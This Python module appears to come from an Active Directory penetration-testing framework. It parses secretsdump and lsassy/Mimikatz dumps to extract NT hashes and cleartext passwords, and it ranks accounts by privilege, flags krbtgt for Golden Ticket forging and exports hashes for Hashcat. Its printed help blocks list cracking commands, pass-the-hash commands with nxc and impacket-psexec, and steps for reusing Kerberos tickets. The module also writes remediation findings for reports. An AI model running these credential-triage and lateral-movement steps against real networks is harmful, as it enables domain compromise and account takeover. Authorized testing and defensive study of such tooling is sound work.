"""
Module: Loot Parser & Analyzer
Techniques: Parse secretsdump / lsassy output, sort/dedup hashes,
            ticket inventory, credential priority scoring,
            identify DA/EA/krbtgt, export CSV/JSON/Markdown
"""
from utils.helpers import *
from config.settings import SESSION
import os, re, json, csv, datetime


# ── INTERNAL SCORER ───────────────────────────────────────────────────────────
def _score_hash(username: str, domain: str = "") -> int:
    """Score a credential entry 1-10 based on privilege likelihood."""
    score = 1
    u = username.lower()
    d = domain.lower()

    # Highest priority
    if u == "krbtgt":                               return 10
    if u in ("administrator", "admin"):             score += 8
    if u == "guest":                                return 1

    # Domain admin indicators
    high_kw = ("da", "domainadmin", "domain admin", "enterpriseadmin",
                "ea", "schema", "backup", "svc_da", "svc_ea")
    if any(k in u for k in high_kw):               score += 7

    # Service accounts
    svc_kw = ("svc", "_svc", "service", "sql", "iis", "web", "exchange",
               "mssql", "smtp", "ldap", "kms", "aad", "msol", "sync")
    if any(k in u for k in svc_kw):                score += 4

    # Admin-like names
    admin_kw = ("admin", "adm", "mgr", "manager", "helpdesk", "it", "support")
    if any(k in u for k in admin_kw):              score += 3

    # Computer accounts (lower value, but useful for delegation)
    if u.endswith("$"):                             score = max(score - 1, 2)

    # Domain context boost
    if d and d not in ("local", "workgroup", "builtin"):
        score += 1

    return min(score, 10)


# ── MAIN RUN ──────────────────────────────────────────────────────────────────
def run():
    print_banner("LOOT PARSER & ANALYZER", "Parse, organize and prioritize credentials")

    print(f"""
  [1]  Parse Secretsdump Output
  [2]  Parse lsassy / Mimikatz Output
  [3]  Kerberos Ticket Inventory (.ccache / .kirbi)
  [4]  Hash Deduplication + Priority Scoring
  [5]  Identify High-Value Hashes (DA / EA / krbtgt / svc)
  [6]  Export to Hashcat-Ready Format
  [7]  Export Findings to CSV / JSON / Markdown
  [8]  Import Credentials to Session Findings
  [0]  Back
""")
    c = input(f"  {M}Choice:{RST} ").strip()

    # ── [1] SECRETSDUMP PARSER ─────────────────────────────────────────────────
    if c == "1":
        dump_file = prompt("Path to secretsdump output file")
        if not os.path.exists(dump_file):
            error(f"File not found: {dump_file}")
            pause()
            return

        users, computers, krbtgt_found, da_candidates = [], [], [], []

        with open(dump_file) as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("[*]") or line.startswith("[+]"):
                    continue

                # Format 1: DOMAIN\user:RID:LM:NT:::
                m = re.match(
                    r'^(.+)\\(.+):(\d+):([a-fA-F0-9]{32}):([a-fA-F0-9]{32}):::',
                    line
                )
                if m:
                    domain, username, rid, lm, nt = (
                        m.group(1), m.group(2), m.group(3), m.group(4), m.group(5)
                    )
                else:
                    # Format 2: user:RID:LM:NT::: (local SAM)
                    m = re.match(
                        r'^(.+):(\d+):([a-fA-F0-9]{32}):([a-fA-F0-9]{32}):::',
                        line
                    )
                    if not m:
                        continue
                    domain, username, rid, lm, nt = (
                        "LOCAL", m.group(1), m.group(2), m.group(3), m.group(4)
                    )

                entry = {
                    "domain":   domain,
                    "username": username,
                    "rid":      int(rid),
                    "lm":       lm,
                    "nt":       nt,
                    "priority": _score_hash(username, domain),
                }

                if username.endswith("$"):
                    computers.append(entry)
                else:
                    users.append(entry)
                if username.lower() == "krbtgt":
                    krbtgt_found.append(entry)
                if entry["priority"] >= 8:
                    da_candidates.append(entry)

        all_entries = sorted(users + computers, key=lambda x: -x["priority"])
        total = len(all_entries)

        success(f"Parsed {total} hashes: {len(users)} user | {len(computers)} computer")
        success(f"krbtgt found : {len(krbtgt_found)}")
        success(f"High-value (score ≥8): {len(da_candidates)}")

        if krbtgt_found:
            print(f"\n  {R}[!!!] KRBTGT HASH FOUND — Golden Ticket possible!{RST}")
            for e in krbtgt_found:
                print(f"  {R}{e['domain']}\\{e['username']} : {e['nt']}{RST}")
                add_finding(
                    "krbtgt Hash Obtained", "Critical",
                    f"krbtgt NT hash: {e['nt']} — Golden Ticket forging possible",
                    "Reset krbtgt password TWICE (inter-replication delay); investigate full domain compromise"
                )

        if da_candidates:
            print(f"\n  {Y}[!] HIGH-VALUE ACCOUNTS (score ≥8):{RST}")
            for e in da_candidates[:15]:
                print(
                    f"  {G}Score {e['priority']:2}{RST} | "
                    f"{e['domain']}\\{e['username']} : {e['nt']}"
                )

        SESSION["_parsed_hashes"] = all_entries
        ts       = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        out_file = f"/tmp/loot_secretsdump_{ts}.json"
        with open(out_file, "w") as f:
            json.dump(all_entries, f, indent=2)
        success(f"Saved parsed data → {out_file}")

    # ── [2] LSASSY / MIMIKATZ PARSER ──────────────────────────────────────────
    elif c == "2":
        dump_file = prompt("Path to lsassy / Mimikatz output file")
        if not os.path.exists(dump_file):
            error(f"File not found: {dump_file}")
            pause()
            return

        found_creds = []
        with open(dump_file) as f:
            content = f.read()

        # lsassy format: DOMAIN\username  NT: <hash>
        for m in re.finditer(
            r'(\S+)\\(\S+)\s+NT:\s*([a-fA-F0-9]{32})', content
        ):
            found_creds.append({
                "domain":   m.group(1),
                "username": m.group(2),
                "nt":       m.group(3),
                "type":     "NT",
                "priority": _score_hash(m.group(2), m.group(1)),
            })

        # Mimikatz sekurlsa format:
        # * Username : <user>
        # * Domain   : <dom>
        # * NTLM     : <hash>
        for m in re.finditer(
            r'\* Username\s*:\s*(\S+).*?\* Domain\s*:\s*(\S+).*?\* NTLM\s*:\s*([a-fA-F0-9]{32})',
            content, re.DOTALL
        ):
            found_creds.append({
                "domain":   m.group(2),
                "username": m.group(1),
                "nt":       m.group(3),
                "type":     "NTLM",
                "priority": _score_hash(m.group(1), m.group(2)),
            })

        # Cleartext passwords
        for m in re.finditer(
            r'\* Username\s*:\s*(\S+).*?\* Domain\s*:\s*(\S+).*?\* Password\s*:\s*(.+)',
            content, re.DOTALL
        ):
            pwd = m.group(3).strip()
            if pwd and pwd not in ("(null)", "null", "None", "") and len(pwd) < 256:
                found_creds.append({
                    "domain":   m.group(2),
                    "username": m.group(1),
                    "password": pwd,
                    "type":     "CLEARTEXT",
                    "priority": _score_hash(m.group(1), m.group(2)) + 2,
                })

        # Deduplicate
        seen, deduped = set(), []
        for e in found_creds:
            key = f"{e['domain']}\\{e['username']}:{e.get('nt', e.get('password',''))}"
            if key not in seen:
                seen.add(key)
                deduped.append(e)

        deduped = sorted(deduped, key=lambda x: -x["priority"])
        success(f"Parsed {len(deduped)} unique credentials")

        cleartext = [e for e in deduped if e.get("type") == "CLEARTEXT"]
        if cleartext:
            print(f"\n  {R}[!!!] CLEARTEXT PASSWORDS FOUND:{RST}")
            for e in cleartext:
                print(f"  {R}{e['domain']}\\{e['username']} → {e['password']}{RST}")
                add_finding(
                    "Cleartext Password in Memory", "Critical",
                    f"{e['domain']}\\{e['username']} cleartext: {e['password']}",
                    "Enable Credential Guard; disable WDigest (reg); apply latest Windows patches"
                )

        print(f"\n  {C}Top credentials:{RST}")
        for e in deduped[:25]:
            print(
                f"  {G}P{e['priority']}{RST} [{e.get('type','NT'):9}] "
                f"{e.get('domain',''):<20}\\{e['username']:<25} "
                + (f": {e['nt']}" if "nt" in e else f": {e.get('password','')}")
            )

        SESSION["_parsed_creds"] = deduped
        ts       = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        out_file = f"/tmp/loot_lsassy_{ts}.json"
        with open(out_file, "w") as f:
            json.dump(deduped, f, indent=2)
        success(f"Saved parsed data → {out_file}")

    # ── [3] TICKET INVENTORY ───────────────────────────────────────────────────
    elif c == "3":
        ticket_dir = prompt("Directory to scan (default=/tmp)") or "/tmp"
        tickets    = []

        for root, _, files in os.walk(ticket_dir):
            for fname in files:
                if fname.endswith((".ccache", ".kirbi")):
                    path  = os.path.join(root, fname)
                    size  = os.path.getsize(path)
                    mtime = datetime.datetime.fromtimestamp(
                        os.path.getmtime(path)
                    ).strftime("%Y-%m-%d %H:%M:%S")
                    tickets.append({
                        "file":     path,
                        "type":     fname.rsplit(".", 1)[-1].upper(),
                        "size":     size,
                        "modified": mtime,
                    })

        success(f"Found {len(tickets)} ticket file(s) in {ticket_dir}")

        if tickets:
            print(f"\n  {C}{'Type':<8} {'Size (B)':<10} {'Modified':<22} File{RST}")
            print(f"  {'─'*8} {'─'*10} {'─'*22} {'─'*55}")
            for t in sorted(tickets, key=lambda x: x["modified"], reverse=True):
                print(
                    f"  {C}{t['type']:<8}{RST} {t['size']:<10} "
                    f"{t['modified']:<22} {t['file']}"
                )

        print(f"""
  {Y}Convert ccache ↔ kirbi:{RST}
  impacket-ticketConverter <file>.ccache <file>.kirbi
  impacket-ticketConverter <file>.kirbi  <file>.ccache

  {Y}Inspect ticket contents:{RST}
  klist -c <file>.ccache
  python3 -c "from impacket.krb5.ccache import CCache; \\
    cc=CCache.loadFile('<file>.ccache'); cc.prettyPrint()"

  {Y}Use ccache (impacket):{RST}
  export KRB5CCNAME=<file>.ccache
  impacket-psexec {SESSION.get("domain","DOMAIN")}/user@target -k -no-pass
  impacket-secretsdump {SESSION.get("domain","DOMAIN")}/user@target -k -no-pass

  {Y}Use ccache (nxc):{RST}
  KRB5CCNAME=<file>.ccache nxc smb target -k --use-kcache

  {Y}Use ccache (evil-winrm):{RST}
  KRB5CCNAME=<file>.ccache evil-winrm -i target -r {SESSION.get("domain","DOMAIN")}

  {Y}Identify ticket type from filename:{RST}
  # Administrator@cifs_DC01.DOMAIN@DOMAIN.ccache  → TGS (service ticket)
  # Administrator@DOMAIN@DOMAIN.ccache             → TGT
""")
        SESSION["_tickets"] = tickets

    # ── [4] DEDUPLICATION + SCORING ───────────────────────────────────────────
    elif c == "4":
        entries = SESSION.get(
            "_parsed_hashes",
            SESSION.get("_parsed_creds", [])
        )
        if not entries:
            warn("No parsed data in session — run option [1] or [2] first.")
            pause()
            return

        seen_nt, unique = set(), []
        for e in entries:
            nt = e.get("nt", "")
            if nt and nt not in seen_nt:
                seen_nt.add(nt)
                unique.append(e)

        dupes = len(entries) - len(unique)
        success(
            f"Total: {len(entries)}  |  Unique: {len(unique)}  |  "
            f"Duplicates removed: {dupes}"
        )

        top = sorted(unique, key=lambda x: -x.get("priority", 0))[:25]
        print(f"\n  {C}{'Score':<6} {'Domain':<20} {'Username':<28} NT Hash{RST}")
        print(f"  {'─'*6} {'─'*20} {'─'*28} {'─'*32}")
        for e in top:
            print(
                f"  {G}{e.get('priority', 0):<6}{RST} "
                f"{e.get('domain', ''):<20} "
                f"{e['username']:<28} "
                f"{e.get('nt', e.get('password', ''))}"
            )

        SESSION["_unique_hashes"] = unique
        success(f"Stored {len(unique)} unique hashes in session (_unique_hashes)")

    # ── [5] HIGH-VALUE IDENTIFICATION ─────────────────────────────────────────
    elif c == "5":
        entries = SESSION.get(
            "_parsed_hashes",
            SESSION.get("_parsed_creds", [])
        )
        if not entries:
            warn("No parsed data in session — run option [1] or [2] first.")
            pause()
            return

        categories = {
            "krbtgt":   [],
            "DA / EA":  [],
            "Admin":    [],
            "Service":  [],
            "Computer": [],
            "Other":    [],
        }

        for e in entries:
            u = e["username"].lower()
            if u == "krbtgt":
                categories["krbtgt"].append(e)
            elif u.endswith("$"):
                categories["Computer"].append(e)
            elif u in ("administrator", "admin") or "admin" in u:
                categories["Admin"].append(e)
            elif any(k in u for k in ("svc", "_svc", "service", "sql", "iis",
                                       "exchange", "msol", "aad", "sync")):
                categories["Service"].append(e)
            elif e.get("priority", 0) >= 8:
                categories["DA / EA"].append(e)
            else:
                categories["Other"].append(e)

        color_map = {
            "krbtgt": R, "DA / EA": R,
            "Admin": Y,  "Service": C,
            "Computer": DIM, "Other": RST,
        }

        for cat, items in categories.items():
            if not items:
                continue
            col = color_map.get(cat, RST)
            print(f"\n  {col}── {cat} ({len(items)}) "
                  f"{'─' * (45 - len(cat))}{RST}")
            for e in items[:12]:
                val = e.get("nt") or e.get("password", "")
                print(f"  {e.get('domain', ''):<20}\\{e['username']:<28} : {val}")
                if cat == "krbtgt":
                    add_finding(
                        "krbtgt Hash Obtained", "Critical",
                        f"krbtgt NT hash: {e.get('nt', '')} — Golden Ticket attack fully possible",
                        "Reset krbtgt password twice with inter-site replication delay; "
                        "audit all domain admin actions in the past 90 days"
                    )
                elif cat in ("DA / EA", "Admin") and e.get("nt"):
                    add_finding(
                        f"High-Privilege Hash: {e['username']}", "Critical",
                        f"{e.get('domain', '')}\\{e['username']} NT: {e.get('nt', '')}",
                        "Rotate all privileged account passwords; "
                        "investigate lateral movement from this account"
                    )

    # ── [6] HASHCAT EXPORT ────────────────────────────────────────────────────
    elif c == "6":
        entries = SESSION.get(
            "_unique_hashes",
            SESSION.get("_parsed_hashes",
            SESSION.get("_parsed_creds", []))
        )
        if not entries:
            warn("No hash data in session — run [1]/[2]/[4] first.")
            pause()
            return

        out_file = (
            prompt("Output file (default=/tmp/hashes_hashcat.txt)")
            or "/tmp/hashes_hashcat.txt"
        )
        user_file = out_file.replace(".txt", "_usernames.txt")
        combo_file= out_file.replace(".txt", "_user_hash.txt")

        count = 0
        with open(out_file,   "w") as fh, \
             open(user_file,  "w") as fu, \
             open(combo_file, "w") as fc:
            for e in entries:
                nt = e.get("nt", "")
                if nt and len(nt) == 32 and re.match(r'^[a-fA-F0-9]{32}$', nt):
                    fh.write(f"{nt}\n")
                    fu.write(f"{e.get('domain', 'LOCAL')}\\{e['username']}\n")
                    fc.write(f"{e.get('domain', 'LOCAL')}\\{e['username']}:{nt}\n")
                    count += 1

        success(f"Exported {count} NT hashes")
        success(f"  Hashes only  → {out_file}")
        success(f"  Usernames    → {user_file}")
        success(f"  User:Hash    → {combo_file}")

        print(f"""
  {Y}Hashcat — NT hash (mode 1000):{RST}
  hashcat -m 1000 {out_file} /usr/share/wordlists/rockyou.txt
  hashcat -m 1000 {out_file} /usr/share/wordlists/rockyou.txt \\
    -r /usr/share/hashcat/rules/best64.rule
  hashcat -m 1000 {out_file} /usr/share/wordlists/rockyou.txt \\
    -r /usr/share/hashcat/rules/d3ad0ne.rule
  hashcat -m 1000 {out_file} -a 3 '?u?l?l?l?l?d?d?d!'
  hashcat -m 1000 {out_file} -a 3 'Season?d?d?d?d'

  {Y}John the Ripper:{RST}
  john --format=NT {out_file} --wordlist=/usr/share/wordlists/rockyou.txt
  john --format=NT {out_file} --rules --wordlist=/usr/share/wordlists/rockyou.txt

  {Y}Pass-the-Hash (no cracking needed):{RST}
  nxc smb {SESSION.get("dc_ip","<DC>")} -u {user_file} \\
    -H {out_file} -d {SESSION.get("domain","<DOMAIN>")} --continue-on-success
  impacket-psexec {SESSION.get("domain","DOMAIN")}/Administrator@{SESSION.get("dc_ip","<DC>")} \\
    -hashes aad3b435b51404eeaad3b435b51404ee:<nt_hash>
""")

    # ── [7] EXPORT FINDINGS ───────────────────────────────────────────────────
    elif c == "7":
        ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        entries = SESSION.get(
            "_unique_hashes",
            SESSION.get("_parsed_hashes",
            SESSION.get("_parsed_creds", []))
        )

        if not entries:
            warn("No credential data in session.")
            pause()
            return

        fmt = (
            prompt("Format: csv / json / markdown (default=markdown)")
            or "markdown"
        ).lower()

        # ── CSV ──
        if fmt == "csv":
            out = f"/tmp/loot_{ts}.csv"
            fieldnames = ["priority", "domain", "username", "nt", "password", "type"]
            with open(out, "w", newline="") as f:
                w = csv.DictWriter(f, fieldnames=fieldnames, extrasaction="ignore")
                w.writeheader()
                for e in sorted(entries, key=lambda x: -x.get("priority", 0)):
                    w.writerow(e)
            success(f"CSV exported → {out}")

        # ── JSON ──
        elif fmt == "json":
            out = f"/tmp/loot_{ts}.json"
            with open(out, "w") as f:
                json.dump(
                    sorted(entries, key=lambda x: -x.get("priority", 0)),
                    f, indent=2
                )
            success(f"JSON exported → {out}")

        # ── MARKDOWN ──
        else:
            out = f"/tmp/loot_{ts}.md"
            lines = [
                "# Credential Dump Report",
                f"**Date:** {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}  ",
                f"**Domain:** {SESSION.get('domain', 'N/A')}  ",
                f"**DC:** {SESSION.get('dc_ip', 'N/A')}  ",
                f"**Total credentials:** {len(entries)}  ",
                "",
                "---",
                "",
                "## High-Value Credentials",
                "",
                "| Priority | Domain | Username | NT Hash / Password | Type |",
                "|----------|--------|----------|--------------------|------|",
            ]

            sorted_entries = sorted(entries, key=lambda x: -x.get("priority", 0))

            for e in sorted_entries:
                val  = e.get("nt") or e.get("password", "")
                typ  = e.get("type", "NT")
                pri  = e.get("priority", 0)
                dom  = e.get("domain", "LOCAL")
                unam = e["username"]
                lines.append(
                    f"| {pri} | {dom} | {unam} | `{val}` | {typ} |"
                )

            # Summary section
            krbtgt = [e for e in entries if e["username"].lower() == "krbtgt"]
            admins = [e for e in entries if "admin" in e["username"].lower()]
            svc    = [e for e in entries if any(
                k in e["username"].lower()
                for k in ("svc", "service", "sql", "exchange", "msol")
            )]

            lines += [
                "",
                "---",
                "",
                "## Summary",
                "",
                f"- **krbtgt hashes:** {len(krbtgt)}",
                f"- **Admin accounts:** {len(admins)}",
                f"- **Service accounts:** {len(svc)}",
                f"- **Total unique hashes:** {len(entries)}",
                "",
                "## Recommended Actions",
                "",
                "- [ ] Reset krbtgt password twice (if krbtgt hash obtained)",
                "- [ ] Rotate all DA / EA account passwords",
                "- [ ] Rotate all service account passwords",
                "- [ ] Enable Credential Guard on all workstations",
                "- [ ] Investigate lateral movement timeline",
                "- [ ] Review persistent access mechanisms",
            ]

            with open(out, "w") as f:
                f.write("\n".join(lines))
            success(f"Markdown report → {out}")

    # ── [8] IMPORT TO SESSION FINDINGS ────────────────────────────────────────
    elif c == "8":
        entries = SESSION.get(
            "_unique_hashes",
            SESSION.get("_parsed_hashes",
            SESSION.get("_parsed_creds", []))
        )
        if not entries:
            warn("No credential data in session — run [1]/[2]/[4] first.")
            pause()
            return

        imported = 0
        for e in entries:
            pri = e.get("priority", 0)
            if pri < 5:
                continue                    # skip low-priority
            val  = e.get("nt") or e.get("password", "")
            severity = (
                "Critical" if pri >= 9 else
                "High"     if pri >= 7 else
                "Medium"
            )
            add_finding(
                f"Credential: {e.get('domain', '')}\\{e['username']}",
                severity,
                f"NT Hash / Password: {val} (Priority score: {pri}/10)",
                "Rotate credential; investigate account usage; "
                "check for lateral movement"
            )
            imported += 1

        success(
            f"Imported {imported} high-priority credentials "
            f"into session findings (threshold: score ≥5)"
        )
        info(
            f"Total session findings: "
            f"{len(SESSION.get('findings', []))}"
        )

    pause()
